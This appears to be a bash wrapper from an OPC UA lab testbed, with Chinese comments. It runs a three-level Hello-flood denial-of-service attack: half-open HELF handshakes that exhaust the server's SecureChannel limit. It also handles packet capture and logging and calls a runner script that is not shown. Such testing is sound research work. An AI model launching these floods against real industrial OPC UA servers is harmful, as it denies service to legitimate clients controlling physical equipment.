#!/usr/bin/env bash
# =============================================================================
# 階段 C — OPC UA Hello 洪水（送半個合法握手 HELF 就停，逼 server 分配 SecureChannel）
#
# 一鍵完成：起系統 → 抓包 → baseline → 漸進三檔攻擊（輕→中→重）→ 收尾
# 產物：C_<時間戳>_{agg,sensor,motor,anomaly}.log  +  C_<時間戳>.pcap
#
# 一次跑完三檔，每檔之間插入恢復空檔。
# 觀察重點：pcap 內會出現真正的 HELF 封包；sensor.log 大量 SecureChannel created；
#           半開 channel 佔滿 maxSecureChannels 後合法 client 拿到 BadTooManySecureChannels
#
# 用法：
#   ./run_dos_C.sh                 # 預設輕→中→重三檔
#   RUN_MOTOR=0 ./run_dos_C.sh
#   BASELINE=30 RECOVER=10 ./run_dos_C.sh
# =============================================================================
cd "$(dirname "$0")"
PORT="${PORT:-4842}"

# 輕 / 中 / 重（conns rate dur）
STEPS=$(cat <<EOF
C --conns 20 --rate 10 --dur 20 --port $PORT
C --conns 40 --rate 20 --dur 20 --port $PORT
C --conns 60 --rate 30 --dur 30 --port $PORT
EOF
)

PHASE=C PORT="$PORT" ATTACK_STEPS="$STEPS" ./dos_runner.sh
